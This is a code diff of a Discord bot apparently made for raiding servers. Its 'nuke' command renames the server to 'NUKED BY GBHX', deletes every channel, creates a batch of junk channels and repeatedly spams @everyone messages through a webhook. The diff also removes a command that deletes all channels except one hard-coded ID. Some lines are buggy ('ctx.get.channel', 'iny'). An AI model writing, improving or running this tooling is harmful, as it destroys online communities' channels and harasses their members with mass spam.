@@ -26,26 +26,6 @@ async def on_ready():
 Logged in and Ready                
 ''')
 
-@bot.command()
-async def d(ctx,channel_id="all"):
-  await ctx.message.delete()
-  if channel_id == "all":
-    for channel in ctx.guild.channels:
-      if channel.id != 834134636678479902:
-        await channel.delete()
-      else:
-        continue
-    await ctx.guild.create_text_channel(name="nuked")
-    print("Nuked All Channels")
-    return
-  else:
-    try:
-      channel = ctx.get.channel(id=iny(channel_id))
-      await channel.delete()
-    except:
-      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
-      await ctx.send(embed=e2)
-    return
 
 @bot.command(pass_context=True)
 async def admin(ctx):
@@ -62,27 +42,14 @@ async def admin(ctx):
 
 
 @bot.command()
-async def nuke1(ctx,amount=10,name_of_channel="nuked-by-gbhx"):
+async def nuke(ctx,amount=10,name_of_channel="nuked-by-gbhx"):
+  await ctx.guild.edit(name="NUKED BY GBHX")
   await ctx.message.delete()
   for channel in ctx.guild.channels:
     if channel.name != "nuked-by-gbhx":
         await channel.delete()
     else:
         continue
-  for times in range(amount):
-    await ctx.guild.create_text_channel(name_of_channel) 
-  for i in range(10):
-      for channel in ctx.guild.text_channels:
-        try:
-          webhook = discord.utils.get(await ctx.channel.webhooks(), name='Spammer')
-          await channel.send(f"Nuked! @everyone GBHX OWNS YOU         ")
-          await webhook.send()
-        except:
-          pass 
-
-@bot.command()
-async def nuke(ctx,amount=10,name_of_channel="nuked-by-gbhx"):
-  await ctx.message.delete()
   for times in range(amount):
     await ctx.guild.create_text_channel(name_of_channel) 
   for i in range(10):
